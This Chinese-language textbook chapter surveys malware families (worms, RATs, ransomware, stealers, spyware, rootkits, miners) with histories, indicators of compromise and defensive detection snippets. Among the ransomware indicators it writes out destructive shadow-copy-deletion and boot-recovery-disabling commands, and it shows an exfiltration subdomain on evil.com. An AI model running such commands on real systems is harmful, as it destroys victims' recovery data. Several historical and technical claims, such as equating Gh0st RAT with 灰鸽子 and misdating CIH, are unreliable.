## 24.4 恶意软件家族分类详解

恶意软件（Malware）并非铁板一块——不同类型的恶意软件在**感染机制、传播方式、持久化策略、攻击目的**上存在本质差异。理解这些差异，是进行有效分析和检测的前提。一个只会用静态特征匹配勒索软件的分析师，面对无文件攻击或Bootkit时将束手无策；一个只熟悉Windows PE分析的团队，遇到Linux挖矿木马时同样会陷入困境。

本节将从**分类体系框架**出发，逐类深入每种恶意软件家族的技术原理、代表性变种、关键检测指标（IoC）和分析要点，构建完整的恶意软件认知地图。

### 24.4.1 恶意软件分类体系概述

恶意软件的分类并非单维度，而是可以从多个维度进行交叉分类：

| 分类维度 | 分类方式 | 典型类别 |
|---------|---------|---------|
| **按功能目的** | 恶意行为的具体目标 | 窃密、勒索、破坏、挖矿、DDoS、僵尸网络 |
| **按传播机制** | 是否具备自我复制能力 | 病毒（需宿主）、蠕虫（自主传播）、木马（依赖社会工程） |
| **按技术实现** | 代码驻留和执行方式 | 文件型、内存型（无文件）、引导区型 |
| **按目标平台** | 受影响的操作系统/设备 | Windows、Linux、macOS、Android、iOS、IoT固件 |
| **按攻击者归属** | 幕后运营者类型 | 网络犯罪组织、APT国家行为体、脚本小子、内部威胁 |
| **按商业模式** | 变现或分发方式 | RaaS（勒索软件即服务）、MaaS（恶意软件即服务）、暗网订阅 |

```mermaid
graph TD
    A[恶意软件] --> B[按功能目的]
    A --> C[按传播机制]
    A --> D[按技术实现]
    A --> E[按目标平台]

    B --> B1[窃密/信息窃取]
    B --> B2[勒索/加密]
    B --> B3[破坏/擦除]
    B --> B4[挖矿/资源劫持]
    B --> B5[僵尸网络/DDoS]
    B --> B6[间谍/监控]

    C --> C1[文件感染型病毒]
    C --> C2[蠕虫]
    C --> C3[木马/后门]
    C --> C4[加载器/Dropper]

    D --> D1[文件驻留型]
    D --> D2[内存驻留型/无文件]
    D --> D3[引导区/Bootkit]
    D --> D4[内核级Rootkit]

    E --> E1[Windows PE]
    E --> E2[Linux ELF]
    E --> E3[macOS/跨平台]
    E --> E4[移动端ARM]
    E --> E5[IoT固件]

    style A fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style B fill:#16213e,stroke:#0f3460
    style C fill:#16213e,stroke:#0f3460
    style D fill:#16213e,stroke:#0f3460
    style E fill:#16213e,stroke:#0f3460
```



在实际分析中，一个恶意软件样本往往同时属于多个类别。例如LockBit既是勒索软件（功能），又是RaaS（商业模式），同时依赖加载器（如BazarLoader）投递（传播机制）。分析师需要从多维度建立对样本的完整认知。

---

### 24.4.2 文件感染型病毒（File Infector）

文件感染型病毒是最古老但仍存活的恶意软件类型。它们通过将自身代码嵌入到合法的可执行文件（PE/ELF/Mach-O）中，当宿主文件被运行时病毒代码随之执行。

#### 核心感染机制

| 感染方式 | 技术原理 | 特征 | 代表家族 |
|---------|---------|------|---------|
| **追加感染** | 将病毒体追加到宿主文件末尾，修改入口点跳转到病毒体 | 宿主文件大小显著增加 | Sality、Virut |
| **代码洞感染** | 利用PE文件节区对齐后的空隙（代码洞/Code Cave）嵌入病毒体 | 宿主文件大小不变，更隐蔽 | Parite |
| **头部/入口点感染** | 替换或劫持宿主文件的入口点代码，跳转至病毒体 | 入口点代码异常 | CIH（切尔诺贝利） |
| **伴生感染** | 不修改原文件，而是创建同名伴生文件或修改搜索顺序 | 原文件完整，但优先执行病毒体 | DLP类变种 |

#### 代表性家族

**CIH（Chernobyl，1998）**
- 最具破坏性的文件感染型病毒之一，由台湾学生陈盈豪编写
- 感染Windows 95/98的PE文件（EXE/SYS）
- **破坏载荷**：向主板BIOS写入随机数据导致无法启动，同时覆盖硬盘主引导记录（MBR）
- 技术特征：利用Win9x的VxD接口直接访问硬件，绕过操作系统保护
- 现实影响：2001年爆发时估计全球造成超过10亿美元损失

**Virut（2004至今）**
- 多态文件感染型蠕虫，感染EXE和SCR文件
- 技术特征：感染时使用XOR加密和多态引擎变异自身代码，每次感染产生不同特征码
- 附加功能：作为IRC后门，连接C2服务器接收远程指令
- 分析要点：感染后系统中所有可执行文件都不可信，清理极其困难，通常建议全盘重装

**Sality（2003至今）**
- 多态病毒引擎，感染PE文件并注入DLL
- 技术特征：通过在被感染文件末尾追加新节区（通常是`.vadata`）实现感染
- 附加功能：下载并执行其他恶意软件、参与DDoS攻击、窃取凭证
- 持久化：修改注册表Run键，创建服务，修改hosts文件

#### 检测与分析要点

文件感染型病毒的分析需要特别关注：
1. **导入表分析**：对比感染前后PE导入表的变化，关注异常API调用（如`CreateRemoteThread`、`VirtualAllocEx`）
2. **节区分析**：检查异常节区名（如`.vadata`、`.PEC2`）和节区大小/权限异常
3. **入口点分析**：入口点指向非`.text`节区或入口点代码与文件类型不匹配
4. **哈希比对**：使用`pefile`库对比已知干净文件与疑似感染文件的结构差异

```python
# 使用pefile检测文件感染痕迹
import pefile

def detect_infection(filepath):
    pe = pefile.PE(filepath)
    indicators = []

    # 检查异常节区
    for section in pe.sections:
        name = section.Name.decode('utf-8', errors='ignore').strip('\x00')
        # 检查非标准节区名
        standard_names = ['.text', '.data', '.rdata', '.bss', '.rsrc',
                          '.reloc', '.idata', '.edata', '.pdata', '.tls']
        if name not in standard_names and name != '':
            indicators.append(f"异常节区名: {name}")

        # 检查可写+可执行权限（RWX）—— 极度异常
        if section.Characteristics & 0xE0000000 == 0xE0000000:
            indicators.append(f"节区 {name} 具有RWX权限（可疑）")

    # 检查入口点是否在第一节区
    ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    first_section = pe.sections[0]
    if ep < first_section.VirtualAddress or ep > first_section.VirtualAddress + first_section.SizeOfRawData:
        indicators.append("入口点不在第一节区内（可能被感染）")

    return indicators
```

---

### 24.4.3 蠕虫（Worm）

蠕虫与病毒的核心区别在于：**蠕虫不需要宿主文件即可独立传播**。它通过网络漏洞、共享文件夹、邮件等途径自主复制和扩散，典型特征是消耗大量网络带宽和系统资源。

#### 蠕虫的传播机制分类

| 传播方式 | 原理 | 代表家族 | 历史影响 |
|---------|------|---------|---------|
| **漏洞自动利用** | 扫描网络中的已知漏洞，自动利用并植入自身 | WannaCry（EternalBlue）、Conficker | 全球性大规模爆发 |
| **邮件传播** | 通过SMTP协议自动向通讯录发送携带自身的邮件 | ILOVEYOU、Melissa、Mydoom | 邮件基础设施瘫痪 |
| **共享/弱口令** | 扫描SMB共享或暴力破解弱密码，复制自身到远程主机 | Slammer、Nimda、Ramnit | 企业内网快速扩散 |
| **即时通讯** | 通过QQ/MSN/微信等通讯工具发送自身链接 | QQ盗号蠕虫、Travian | 社交网络扩散 |
| **P2P传播** | 利用BitTorrent或eMule等P2P网络分发 | Sality变种、Storm蠕虫 | 利用合法分发渠道 |

#### 代表性家族深度分析

**WannaCry（WannaCrypt，2017）**
- 2017年5月12日全球爆发的勒索蠕虫，影响150个国家、30万台计算机
- **传播机制**：利用NSA泄露的EternalBlue（MS17-010）漏洞攻击SMBv1协议，同时使用DoublePulsar后门作为备用传播通道
- **勒索机制**：AES-128 + RSA-2048混合加密，赎金300-600美元比特币
- **终止开关**：安全研究员Marcus Hutchins意外发现并注册了一个硬编码的"Kill Switch"域名（`iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`），阻止了后续传播
- **技术特征**：
  - 加密文件扩展名：.WNCRY、.WNCRYT
  - 勒索信：`@Please_Read_Me@.txt`
  - 互斥量：`Global\MsWinZonesCacheCounterMutexA0`
  - 服务名：`mssecsvc2.0`
- **分析价值**：WannaCry展示了蠕虫+勒索软件组合的毁灭性威力，也成为全球网络安全投入的分水岭事件

**Conficker（2008-2009）**
- 史上传播范围最广的蠕虫之一，感染全球900万-1500万台计算机
- **传播机制**：利用Windows Server服务漏洞（MS08-067）+ 爆破网络共享弱密码 + USB自动运行
- **技术演进**：从A版到E版持续升级，后期版本禁用Windows Update、阻断安全软件通信、使用P2P（Kademlia DHT）C2协议替代域名生成算法（DGA）
- **核心检测指标**：
  - 异常的`srvsvc`服务活动
  - Windows Security中心服务被禁用
  - 大量对外SMB连接（TCP 445）
  - 异常的svchost.exe进程行为

**Mydoom（2004）**
- 史上传播最快的邮件蠕虫，爆发首日感染超100万台计算机
- **传播机制**：从Windows地址簿、ICQ联系人、本地硬盘文件中提取邮件地址，通过自带SMTP引擎发送携带自身的邮件
- **附加功能**：安装后门（端口31270）、参与DDoS攻击（目标为SCO Group和微软）
- **技术特征**：邮件主题和正文使用随机组合的字符串模板，附件名和扩展名随机变化

#### 蠕虫分析的关键指标

| 指标类型 | 具体内容 | 检测工具 |
|---------|---------|---------|
| 网络行为 | 大量对外连接（端口445/135/139）、异常DNS查询、大量邮件发送 | Wireshark、Zeek |
| 系统行为 | 新增服务/计划任务、注册表修改、文件释放 | Process Monitor、Autoruns |
| 传播痕迹 | 新增SMB会话、远程进程创建（PsExec/WMI） | Sysmon、Security事件日志 |
| 文件特征 | 异常的可执行文件、修改后的系统文件 | YARA规则、文件哈希比对 |

---

### 24.4.4 木马/后门（Trojan/Backdoor）

木马（Trojan Horse）是当前数量最庞大的恶意软件类别。与病毒和蠕虫不同，木马**不具备自我复制能力**，而是伪装成合法软件诱骗用户主动安装。后门（Backdoor）则是木马的一个重要子类，为攻击者提供持久的远程访问通道。

#### 木马的分类体系

| 子类别 | 功能描述 | 代表性家族 | 攻击场景 |
|-------|---------|-----------|---------|
| **远控木马/RAT** | 提供完整的远程控制能力 | Cobalt Strike、AsyncRAT、NjRAT、Gh0st RAT | APT渗透、网络犯罪 |
| **银行木马** | 窃取银行凭证，进行网银欺诈 | Zeus、Emotet、TrickBot、QakBot | 金融犯罪 |
| **信息窃取器** | 窃取浏览器凭证、加密货币钱包、系统信息 | RedLine、Raccoon、Vidar、Formbook | 数据贩卖 |
| **下载器/加载器** | 下载并执行其他恶意软件 | BazarLoader、IcedID、QakBot | 攻击链初期投递 |
| **Dropper** | 释放恶意载荷到系统中 | Emotet Dropper、TrickBot Dropper | 恶意软件分发 |
| **间谍木马** | 监控用户行为、窃取敏感数据 | Pegasus、FinFisher、DarkComet | 国家级间谍活动 |
| **DDoS木马** | 被控参与分布式拒绝服务攻击 | Mirai、Mozi、Bashlite | 大规模DDoS攻击 |
| **挖矿木马** | 利用受害者算力进行加密货币挖矿 | XMRig变种、Lemon Duck | 经济获利 |

#### 代表性家族深度分析

**Cobalt Strike**
- 原本是合法的红队渗透测试工具（基于Metasploit），现已成为最广泛滥用的攻击框架
- **架构设计**：Team Server（服务端）+ Client（操作端）+ Beacon（植入物/客户端）
- **Beacon功能**：
  - 多种通信方式：HTTP/HTTPS/DNS/Named Pipes/SMB
  - 丰富的后渗透模块：凭证提取（Mimikatz集成）、横向移动（PsExec/SMB/WMI）、持久化（服务/注册表/计划任务）
  - 支持自定义脚本（CNA）扩展功能
  - 内存中的Beacon不写入磁盘，规避传统检测
- **通信特征**：
  - 默认HTTP Beacon：GET请求到特定URI（如`/submit.php?id=<beacon_id>`）
  - 默认Malleable C2配置文件使用特定的User-Agent和Cookie格式
  - DNS Beacon使用长子域名编码数据（如`abc123def456.evil.com`）
- **检测要点**：
  - 异常的HTTP请求模式（固定间隔、固定URI模式、特定User-Agent）
  - 内存中的Beacon特征（特定的配置块结构和加密方式）
  - 异常的进程注入行为（rundll32.exe/svchost.exe行为异常）
  - YARA规则匹配Beacon特征码

```python
# Cobalt Strike Beacon 常见检测特征
# 基于内存特征的检测逻辑
BEACON_CONFIG_MARKERS = {
    'aes_key': b'',  # 64字节AES密钥（加密后的配置块开头）
    'watermark': [0x00, 0x00, 0x00, 0x00],  # 水印标识
    'pipe_names': ['\\.\pipe\msagent_', '\\.\pipe\MSSE-'],
    'default_uris': ['/submit.php', '/jquery-3.3.1.min.js',
                     '/static/app.js', '/api/v1/'],
}

# Cobalt Strike 的默认 JA3/JA3S 指纹
JA3_FINGERPRINTS = {
    'beacon_http': '72a589da586844d7f0818ce684948eea',
    'team_server': 'a0e9f5d64349fb13191bc781f81f42e1',
}
```

**Gh0st RAT（灰鸽子）**
- 中国黑客社区最广泛使用的远控木马之一，2004年首次发现
- **通信协议**：自定义TCP协议，使用zlib压缩 + XOR加密
- **功能集**：远程桌面、文件管理、注册表编辑、键盘记录、摄像头/麦克风监控、进程/服务管理、屏幕截图、语音监听
- **变种生态**：大量二次开发变种（如DarkComet、Orcus RAT等受其架构影响），每个变种修改默认端口和加密密钥
- **分析要点**：默认端口TCP 80/8080，配置信息以明文或简单加密存储在资源节区中

**AsyncRAT**
- 开源的跨平台远程访问工具，被大量攻击者滥用
- **功能特性**：屏幕监控、文件管理、进程管理、键盘记录、凭证窃取、摄像头/麦克风监控、DDoS攻击
- **通信协议**：自定义TCP协议，支持SSL/TLS加密
- **配置加密**：使用Base64 + AES加密存储配置信息，密钥可从内存中提取
- **检测指标**：
  - 异常的schtasks.exe调用（持久化）
  - 注册表项`HKCU\Software\<mutex_name>`
  - 内存中的AES加密配置块（128/256位密钥）

**NjRAT**
- 广泛传播的远程访问木马，主要在中东地区活跃
- **功能特性**：远程桌面控制、文件管理、注册表编辑、键盘记录、密码窃取、摄像头监控、DDoS攻击
- **传播方式**：通过可移动存储设备、恶意邮件附件、伪装成游戏和软件
- **协议特征**：使用TCP协议，配置信息通过管道符分隔的明文字符串传输
- **检测指标**：
  - 异常的进程创建链（Excel→cmd→powershell→.NET进程）
  - 注册表自启动项
  - 异常的TCP连接到非标准端口

---

### 24.4.5 勒索软件家族深度分析

勒索软件（Ransomware）已发展为网络犯罪中最有利可图的攻击形式，形成了完整的犯罪生态系统。2023年全球勒索软件攻击造成的损失估计超过300亿美元（Cybersecurity Ventures数据）。

#### 勒索软件技术演进

```mermaid
graph LR
    A[早期勒索软件<br>2005-2012<br>简单加密+邮件勒索] --> B[勒索蠕虫<br>2013-2016<br>加密算法强化<br>自动化传播]
    B --> C[RaaS平台<br>2016-2020<br>商业模式创新<br>双重勒索]
    C --> D[多元化勒索<br>2020至今<br>跨平台+三重勒索<br>数据窃取+DDoS]

    style A fill:#2d2d44,stroke:#e94560
    style B fill:#2d2d44,stroke:#e94560
    style C fill:#2d2d44,stroke:#e94560
    style D fill:#2d2d44,stroke:#e94560
```



#### RaaS（勒索软件即服务）运营模式

RaaS模式极大降低了攻击门槛，形成了完整的犯罪供应链：

| 角色 | 职责 | 技术门槛 | 收益分成 |
|------|------|---------|---------|
| **开发者** | 开发和维护勒索软件核心代码和基础设施 | 极高（逆向工程、加密、C2开发） | 20%-40% |
| **附属成员** | 执行实际攻击：入侵网络、横向移动、部署勒索 | 中高（渗透测试能力） | 60%-80% |
| **初始访问代理** | 提供受感染网络的初始访问权限 | 中（钓鱼投递、漏洞利用） | 按次收费$500-$50,000 |
| **数据托管/泄露平台** | 运营暗网泄露网站，托管被盗数据 | 中（Tor运维、前端开发） | 平台费或广告收入 |
| **洗钱团队** | 将赎金通过混币器、跨链桥等手段清洗 | 高（加密货币追踪对抗） | 10%-20% |

#### 代表性勒索软件家族

**LockBit系列**
- 2020年代最活跃的RaaS家族之一，2022年攻击数量占全球勒索事件的近四分之一
- **版本演进**：LockBit 1.0（2019）→ LockBit 2.0（2021）→ LockBit 3.0/Black（2022）→ LockBit Green（2023）
- **技术特征**：
  - 使用RSA-2048 + AES-256混合加密算法
  - 利用Windows组策略（GPO）进行大规模传播
  - 支持自动化的网络渗透和横向移动
  - LockBit 3.0借鉴了BlackMatter的代码，部分模块使用Zig语言编写
  - 平均加密速度：可在45分钟内加密完整的域环境
- **商业模式**：招募附属成员（Affiliate），提供勒索软件基础设施和谈判服务，按比例分成赎金
- **关键检测指标**：
  - 勒索信文件名：`restore-my-files.txt` / `readme.txt`
  - 加密文件扩展名：`.lockbit` / `.lockbit3` / `.abcd`
  - 互斥量：`Global\{BEF590BE-11A6-442A-A85B-656C1081E04C}`
  - 删除卷影副本命令：`vssadmin.exe delete shadows /all /quiet`
  - 变更安全设置：`bcdedit /set {default} recoveryenabled no`

**Conti/TrickBot生态系统**
- 历史上最活跃的勒索软件组织之一，与TrickBot僵尸网络紧密关联
- **完整攻击链**：Emotet/TrickBot投递 → BazarLoader加载 → Cobalt Strike部署 → Active Directory渗透 → Conti勒索
- **技术特征**：
  - 使用多线程加密，加密速度极快（数百GB数据可在数小时内完成）
  - 利用Windows重启管理器（`RstrtMgr.exe`）绕过文件锁定
  - 支持命令行参数配置加密行为（`-p`指定加密路径，`-m`指定加密模式）
  - 使用自定义的ChaCha8流密码算法进行文件加密
  - 使用AES加密C2通信
- **泄露事件**：2022年Conti内部聊天记录被泄露（ContiLeaks），揭示了其类似企业的组织结构、薪资体系和运营模式
- **关键检测指标**：
  - 勒索信文件名：`CONTI_README.txt`
  - 加密文件扩展名：随机生成
  - 互斥量：`YUIOGHJKCVVBNMFGHJKTYQUWIETASKDHGZBDJ`
  - 服务名：`Conti`

**BlackCat/ALPHV**
- 首个使用Rust语言编写的主流勒索软件家族（2021年11月首次发现）
- **技术特征**：
  - 跨平台支持：Windows、Linux、VMware ESXi（虚拟机勒索是其标志性攻击方式）
  - 使用Rust语言编写，编译优化好，难以逆向分析
  - 支持多种加密算法选择（AES-CBC、AES-CTR、XChaCha20等）
  - 通过命令行参数灵活配置加密行为
  - 使用JSON格式配置文件，存储在PE资源节区中
  - 支持自定义加密扩展名和勒索信
- **攻击模式**：双重勒索（加密+数据窃取威胁），部分案例升级为三重勒索（+DDoS攻击威胁）
- **关键检测指标**：
  - 配置文件特征：包含`access_token`字段的JSON配置
  - 命令行参数：`--access-token <token> --child --drag-and-drop`
  - 加密文件扩展名：随机生成的7位字母
  - 赎金信文件名：`RECOVER-<扩展名>-FILES.txt`
  - ESXi变种：删除VMX文件并加密VMDK文件

**Play勒索软件**
- 2022年以来活跃度持续上升，以其独特的加密方式著称
- **技术特征**：
  - 使用AES-RSA混合加密
  - **间歇性加密（Intermittent Encryption）**：仅加密文件的部分内容（如每隔16KB加密一个块），大幅提升加密速度同时保证数据不可恢复
  - 利用ProxyShell漏洞和FortiOS漏洞（CVE-2022-42475）进行初始访问
  - 使用自定义的编码工具和DLL侧加载技术绕过安全检测
- **关键检测指标**：
  - 加密文件扩展名：`.play` / `.playa`
  - 勒索信文件名：`ReadMe.txt`
  - 独特的间歇性加密模式（文件中间仍可见部分明文）

**REvil/Sodinokibi**
- 高度组织化的RaaS组织，2019-2021年最活跃的勒索软件之一
- **标志性攻击**：2021年7月攻击Kaseya VSA远程管理工具，通过供应链攻击影响约1,500家企业
- **技术特征**：
  - 使用AES-256-CBC + RSA-2048混合加密
  - 支持命令行参数配置，参数以随机数字字母键值对形式传递
  - 多线程并行加密，利用合法系统工具（WMI、PowerShell）进行横向移动
  - 内置反调试和反沙箱检测机制
- **关键检测指标**：加密文件扩展名为随机7-10位字母，勒索信名为`<random>-readme.txt`

**DarkSide**
- 2020-2021年活跃的RaaS组织，以企业级目标为主
- **标志性攻击**：2021年5月攻击Colonial Pipeline（美国最大燃油管道运营商），导致美国东海岸燃油供应中断数天
- **特点**：声称遵守"道德准则"，不攻击医院、学校、非营利组织（实际执行并不一致）
- **技术特征**：使用AES-256-CBC + RSA-1024加密，支持Windows和VMware ESXi

---

### 24.4.6 银行木马与信息窃取器

这类恶意软件以窃取金融凭证、加密货币资产和个人敏感信息为核心目标，已形成暗网中规模庞大的地下经济。

#### 银行木马演进时间线

| 时期 | 代表家族 | 关键技术突破 |
|------|---------|-------------|
| 2007-2010 | Zeus (Zbot) | Web注入（Man-in-the-Browser）、表单抓取 |
| 2011-2014 | Citadel、Carberp | 反分析技术、模块化架构 |
| 2014-2017 | Emotet、Dridex | 恶意软件分发平台化、多阶段投递 |
| 2017-2020 | TrickBot、QakBot | 横向移动能力、勒索软件投递 |
| 2020至今 | IcedID、BazarLoader | 作为初始访问代理、与勒索软件生态融合 |

#### 代表性家族

**Emotet**
- 从2014年的简单银行木马发展为全球最危险的恶意软件分发平台，被称为"恶意软件世界的万能钥匙"
- **演进历程**：
  - 第一阶段（2014-2017）：银行木马，窃取银行凭证
  - 第二阶段（2017-2020）：恶意软件分发平台，投递TrickBot、Ryuk等
  - 第三阶段（2021至今）：2021年1月全球执法行动"Operation Ladybird"取缔后，同年11月重建基础设施恢复攻击
- **模块架构**：
  - 核心模块：持久化、更新、C2通信
  - 邮件模块：窃取Outlook邮件内容和联系人列表
  - 浏览器模块：窃取保存的密码和Cookie
  - 传播模块：利用窃取的邮件模板进行自我传播（"社会工程增强"）
  - 附加模块：下载并执行其他恶意软件
- **传播方式**：恶意邮件附件（Office文档+VBA宏）、恶意链接、僵尸网络间传播
- **技术特征**：
  - 使用模块化DLL加载架构，各模块通过配置文件中的编号选择性加载
  - 多层加密的C2通信（外层RSA + 内层AES）
  - 环境感知：检测虚拟机、沙箱和调试器环境
  - 持久化：通过注册表Run键和计划任务

**QakBot/QBot**
- 成熟的银行木马，近年来发展为恶意软件分发平台和初始访问代理
- **技术特征**：
  - 使用线程注入技术注入合法进程（如explorer.exe）
  - 多层加密的C2通信（SSL/TLS + 自定义加密层）
  - 模块化架构，支持动态加载功能模块
  - 使用环境密钥（Environment Key）防止分析——密钥基于主机名、用户名等系统信息生成
  - 支持VBS/PowerShell多阶段投递链
- **传播方式**：恶意邮件（发票/运输通知/合同主题）、SEO投毒、恶意广告
- **关键检测指标**：
  - 异常的explorer.exe内存分配行为
  - 注册表自启动项：`HKCU\Software\Wow6432Node\Microsoft\<random>`
  - 互斥量：基于系统信息生成的随机字符串

**TrickBot**
- 功能复杂的模块化僵尸网络，曾是Emotet之后最活跃的恶意软件分发平台
- **模块化架构**：超过20个功能模块，包括凭证窃取、横向移动、勒索软件投递等
- **横向移动能力**：内置类似Mimikatz的凭证提取模块和类PsExec的远程执行能力
- **反检测措施**：多阶段加载、内存执行、定期更新模块、使用合法证书签名
- **与勒索软件关联**：是Conti、Ryuk、REvil等勒索软件的主要投递通道

**RedLine Stealer**
- 当前最流行的信息窃取器，在暗网市场上以订阅模式销售（$100-$200/月）
- **窃取能力**：
  - 浏览器保存的密码、Cookie、自动填充数据（Chrome、Firefox、Edge）
  - 加密货币钱包文件和种子短语（MetaMask、Exodus、Electrum等）
  - FTP和VPN客户端凭据（FileZilla、WinSCP、NordVPN等）
  - 系统信息：硬件配置、已安装软件、进程列表、已安装程序列表
  - 屏幕截图
  - Discord/Telegram令牌
- **交付方式**：伪装成破解软件、游戏外挂、工具软件的恶意安装包
- **技术特征**：.NET编写，使用Obfuscar混淆器，C2通信使用HTTP POST

**Raccoon Stealer (v2 / RecordBreaker)**
- 另一款广泛使用的信息窃取器，2022年原始开发者被捕后以RecordBreaker名义复活
- **与RedLine的区别**：更侧重浏览器数据和加密货币钱包的批量提取，功能相对精简
- **暗网售价**：约$200/月，提供Telegram Bot接口

---

### 24.4.7 间谍软件（Spyware）

间谍软件专注于长期、隐蔽的监控和数据窃取，与普通信息窃取器的区别在于：间谍软件通常具备**持久驻留能力、持续监控能力**，且攻击目标往往是特定的高价值个体或组织。

#### 间谍软件技术层级

| 技术层级 | 能力描述 | 代表工具 |
|---------|---------|---------|
| **商业级间谍软件** | 零日漏洞利用、全平台覆盖、无法被常规安全产品检测 | Pegasus（NSO Group）、Predator（Cytrox/Intellexa） |
| **国家级间谍工具** | 内核级Rootkit、供应链投递、硬件级持久化 | FinFisher、DarkSide RAT |
| **商业监控软件** | 功能完善、定价合理、面向企业和家长监控市场 | mSpy、FlexiSPY、Cocospy |
| **开源/定制间谍软件** | 开源工具修改版、针对性开发的间谍载荷 | njRAT定制版、Orcus RAT |

**Pegasus（NSO Group）**
- 被称为"最强大的手机间谍软件"，由以色列NSO Group开发
- **攻击能力**：
  - 零点击攻击（Zero-Click）：无需用户交互即可感染设备（利用iMessage、WhatsApp等漏洞）
  - 支持iOS和Android全平台
  - 可读取加密消息（WhatsApp、Signal、Telegram的本地数据库）
  - 可激活摄像头和麦克风进行实时监控
  - 可追踪GPS位置
- **技术特征**：利用iOS的FORCEDENTRY漏洞（PDF渲染漏洞）实现零点击感染，感染后数据通过专有协议加密回传
- **影响范围**：被多国政府用于监控记者、政治活动家和人权律师，2021年"飞马计划"（Pegasus Project）调查揭露了其大规模监控活动

**FinFisher/FinSpy**
- 德国公司Gamma Group开发的商业级监控软件，曾销售给多国执法机构
- **功能集**：键盘记录、屏幕截图、文件窃取、麦克风/摄像头监控、即时通讯监控
- **技术演进**：使用UEFI引导区Rootkit、多层加密、反虚拟机技术
- **暴露事件**：2012年反阿萨德活动人士在其设备中发现了FinFisher样本，随后被安全社区广泛分析

---

### 24.4.8 Rootkit与Bootkit

Rootkit是恶意软件中最难以检测和清除的类型，其核心目标是**隐藏自身和其他恶意组件的存在**，维持对系统的持久控制。

#### Rootkit技术层级

| 层级 | 技术位置 | 技术原理 | 检测难度 | 代表家族 |
|------|---------|---------|---------|---------|
| **用户态Rootkit** | 用户空间 | API钩子（IAT/EAT钩子、Inline Hook）、DLL注入 | ★★★ | Necurs、ZeroAccess |
| **内核态Rootkit** | 内核空间 | SSDT钩子、IRP钩子、对象回调、DKOM | ★★★★★ | TDL4、Alureon、ZeroAccess |
| **虚拟化Rootkit** | Hypervisor层 | 修改CPU虚拟化标志（VME），在更底层运行 | ★★★★★ | Blue Pill（概念验证） |
| **引导区Rootkit** | MBR/VBR/UEFI | 劫持系统引导流程，在OS加载前执行恶意代码 | ★★★★★+ | Rovnix、FinFisher Bootkit |

#### 代表性家族

**TDL4（Alureon）**
- 最复杂的Windows Rootkit之一，感染MBR和VBR
- **技术架构**：
  - 修改MBR/VBR，在系统启动最早期阶段加载恶意驱动
  - 恶意驱动在内核层运行，过滤文件系统和网络请求
  - 通过加密P2P（Overnet）协议建立C2通信，使用分布式节点网络，难以完全关闭
- **隐藏能力**：过滤驱动阻止安全软件检测、隐藏被感染的文件和注册表项、篡改系统文件的数字签名验证结果
- **检测方法**：需要在操作系统启动之前进行检测（如使用专用的Rootkit扫描工具GMER、Kaspersky TDSSKiller）

**UEFI Rootkit**
- 在UEFI固件层面植入恶意代码，即使重装系统也无法清除
- **代表性案例**：
  - MosaicRegressor（2021，Kaspersky发现）：感染UEFI固件的SPI闪存芯片
  - ESPecter（2021）：修改EFI系统分区（ESP）中的引导文件
  - BlackLotus（2023）：绕过UEFI Secure Boot，利用CVE-2022-21894漏洞
- **技术特征**：恶意代码存储在主板SPI闪存或EFI系统分区中，在操作系统加载前执行，对OS完全透明
- **检测挑战**：传统杀毒软件无法检测，需要使用固件完整性检查工具（如CHIPSEC、UefiTool）

#### Bootkit检测与防御

```bash
# 使用CHIPSEC检查UEFI固件完整性
pip install chipsec
chipsec_main --module tools.uefi.read_efi_variable

# 使用UEFITool检查固件镜像中的异常模块
UEFITool firmware_image.bin

# 检查ESP分区中的引导文件完整性
# Linux下检查EFI分区
mount /dev/sda1 /mnt/efi
find /mnt/efi -name "*.efi" -exec sha256sum {} \;
```

---

### 24.4.9 加密货币挖矿恶意软件（Cryptominer）

加密货币挖矿木马利用受害者设备的CPU/GPU算力进行加密货币挖矿，已成为最普遍的恶意软件类型之一。根据McAfee报告，2023年检测到的加密货币挖矿恶意软件数量同比增长超过300%。

#### 挖矿木马分类

| 类型 | 目标 | 技术特点 | 攻击规模 |
|------|------|---------|---------|
| **企业级挖矿** | 云服务器、数据中心 | Kubernetes/Docker渗透、容器逃逸 | 数千至数万台服务器 |
| **消费者级挖矿** | 个人PC、游戏主机 | 伪装成合法软件、浏览器挖矿脚本 | 大规模低价值目标 |
| **IoT挖矿** | 路由器、摄像头、智能设备 | ARM/MIPS架构、低功耗优化 | 数十万台设备组成僵尸网络 |
| **浏览器挖矿** | 访问网页的浏览器用户 | WebAssembly/JavaScript、Coinhive模式 | 利用网站流量 |

#### 代表性家族

**Lemon Duck**
- 跨平台加密货币挖矿僵尸网络，支持Windows和Linux
- **传播机制**：利用Redis未授权访问、EternalBlue漏洞、SSH暴力破解、邮件传播
- **技术特征**：使用PowerShell和Python双语言实现，支持XMR（门罗币）和Dero挖矿
- **反检测措施**：进程注入、定期更新矿池地址、使用合法域名作为C2
- **影响范围**：高峰期控制超过50万台设备

**Mirai及其变种**
- 最具影响力的IoT僵尸网络之一，2016年首次出现
- **感染机制**：扫描IoT设备的默认Telnet/SSH凭证（超过60组硬编码的用户名/密码组合），登录后植入自身
- **目标设备**：网络摄像头、路由器、DVR/NVR、智能家电等基于Linux的IoT设备
- **2016年Dyn攻击**：Mirai僵尸网络利用约60万台IoT设备发起DDoS攻击，导致Twitter、Netflix、GitHub、Reddit等主要网站和服务中断数小时
- **开源影响**：源代码公开后产生大量变种（Mozi、Satori、Okiru等），至今仍是最活跃的IoT威胁之一
- **挖矿功能**：部分Mirai变种整合了XMRig矿机进行门罗币挖矿

**Coinhive（已关闭）**
- 2017-2019年流行的浏览器端加密货币挖矿服务
- **原理**：网站嵌入JavaScript脚本，利用访问者的浏览器CPU进行门罗币挖矿
- **滥用情况**：被大量网站（包括政府网站、 pirate bay）未经用户同意嵌入使用
- **恶意利用**：被捆绑在恶意广告中、嵌入到被入侵的网站中、伪装成Adobe Flash更新
- **关闭原因**：门罗币算法变更导致CPU挖矿效率下降，2019年3月正式关闭服务

---

### 24.4.10 广告软件与灰色软件（Adware/PUP）

广告软件（Adware）和潜在不需要程序（PUP/PUA）虽然通常不被视为传统恶意软件，但它们在实际安全运营中造成了大量困扰，且越来越多地与真正的恶意软件结合出现。

#### 典型行为模式

| 行为 | 技术实现 | 用户影响 |
|------|---------|---------|
| **浏览器劫持** | 修改浏览器主页、搜索引擎、新标签页设置 | 用户体验严重下降 |
| **广告注入** | 在网页中注入额外广告、弹窗、重定向 | 浏览速度下降、误点击风险 |
| **数据收集** | 收集浏览习惯、搜索记录、地理位置信息 | 隐私泄露 |
